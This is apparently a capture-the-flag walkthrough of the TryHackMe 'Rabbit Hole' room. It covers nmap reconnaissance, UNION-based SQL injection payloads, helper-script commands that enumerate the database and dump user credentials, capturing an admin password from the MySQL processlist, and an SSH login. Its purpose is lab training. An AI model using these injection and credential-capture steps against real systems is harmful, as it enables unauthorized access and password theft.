# TryHackMe: Rabbit Hole Walkthrough: Full Exploit & Capture-the-Flag Guide

##  Challenge Overview

**Platform:** TryHackMe
**Room Name:** Rabbit Hole
**Category:** Web Exploitation, SQL Injection, Enumeration, Processlist Abuse
**Difficulty:** Intermediate

<!--
Keywords: tryhackme rabbit hole writeup, second-order sqli, processlist mysql exploit, ssh login sql injection, sql injection challenge solution, CTF walkthrough rabbit hole, information_schema processlist attack, MySQL md5 password capture, ethical hacking SQLi lab
-->

> This is a complete, step-by-step walkthrough to solve the "Rabbit Hole" room on TryHackMe. It includes command-line tools, Python automation scripts, payloads, and final shell access to capture the flag.

---

##  Step 1: Initial Reconnaissance

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.173.12
```

**Discovered Open Ports:**

```
22/tcp (SSH)
80/tcp (HTTP)
```

Visit:

```
http://10.10.173.12
```

Identified login/register form and "Last Logins" feature reflecting usernames (possible injection point).

---

##  Step 2: SQL Injection Detection

Test Payload:

```sql
' UNION SELECT 1;--
```

**Error Response:** Column mismatch confirms SQL injection is possible.

Working Payload:

```sql
' UNION SELECT 1,2;--
```

This confirms 2 columns are expected.

---

##  Step 3: Extract Database Names

```bash
python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'
```

**Result:**

```
information_schema,web
```

---

##  Step 4: Extract Table Names from `web`

```bash
python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="web"'
```

**Tables Found:**

```
users,logins
```

---

##  Step 5: Extract Columns from `users`

```bash
python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema="web" AND table_name="users"'
```

**Columns:**

```
id,username,password,group
```

---

##  Step 6: Dump User Data

```bash
python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users WHERE id<4'
```

**Dumped:**

```
1:admin:0e3ab8...:admin
2:foo:abc123:user
3:bar:iloveyou:user
```

---

##  Step 7: Monitor `PROCESSLIST` for Admin Password

Repeatedly run:

```bash
python3 processlist_extractor.py 'http://10.10.173.12/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
```

**Target Output Example:**

```sql
SELECT * FROM users WHERE username='admin' AND password=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q')
```

Extract the cleartext password inside the `md5()` function.

---

##  Step 8: SSH Login as Admin

```bash
ssh admin@10.10.173.12
```

**Password:**

```
fEeFBqOXBOLmjpTt0B3LNpuwlr7---------------------------
```

---

##  Step 9: Capture the Flag

```bash
ls
cat flag.txt
```

**Flag:**

```
THM{**********************************************}
```

---

##  Tools & Techniques Used

* `nmap`, `curl`, `Burp Suite`
* Manual SQL injection testing
* `information_schema` enumeration
* MySQL `PROCESSLIST` query leakage
* Python scripting (`requests`, `bs4`)

---

##  Included Scripts

### `sqli_automation.py`

Simulates a manual `SQL injection login flow` and prints the full page response for inspection.

### `sqli_automate2.py`

Automates 16-character chunked SQL data extraction using `SUBSTR`.

### `processlist_extractor.py`

Multi-threaded script to capture live SQL queries from MySQL `information_schema.processlist`.

---

##  Writeup by: Mohsin Arif

**GitHub:** [https://github.com/mhsn1](https://github.com/mhsn1)
**TryHackMe:** [https://tryhackme.com/p/mhsn1](https://tryhackme.com/p/mhsn1)

**Keywords:** tryhackme rabbit hole writeup, mysql processlist exploit, second-order sql injection, ethical hacking walkthrough, capture the flag sql injection, offensive enumeration tutorial
